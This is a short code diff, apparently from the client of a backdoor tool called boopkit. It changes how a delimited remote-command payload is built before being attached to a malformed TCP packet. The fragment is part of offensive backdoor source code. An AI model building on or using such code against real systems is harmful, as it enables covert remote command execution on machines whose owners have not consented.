@@ -237,9 +237,7 @@ int main(int argc, char **argv) {
   int packet_len;
   // Create delimited payload
   char payload[MAX_RCE_SIZE];
-  sprintf(payload, "%s%s;#%s", BOOPKIT_RCE_DELIMITER, cfg.rce, BOOPKIT_RCE_DELIMITER);
-
-  //boopprintf("  -> Full Payload: %s\n", payload);
+  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce, BOOPKIT_RCE_DELIMITER);
 
   // Create a malformed TCP packet with an arbitrary command payload attached to
   // the packet.
